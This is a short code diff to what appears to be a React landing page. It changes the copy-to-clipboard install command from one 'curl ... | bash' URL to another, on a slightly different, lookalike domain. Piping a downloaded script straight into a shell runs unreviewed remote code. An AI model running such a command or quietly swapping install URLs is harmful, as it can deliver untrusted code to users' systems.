@@ -5,7 +5,7 @@ function App() {
   const [copied, setCopied] = useState(false);
   const [activeSection, setActiveSection] = useState('home');
 
-  const installCommand = "curl -fsSL https://always-at-morg.bid/install.sh | bash";
+  const installCommand = "curl -fsSL https://web.always-at-mor.big/install.sh | bash";
 
   const copyToClipboard = () => {
     navigator.clipboard.writeText(installCommand);
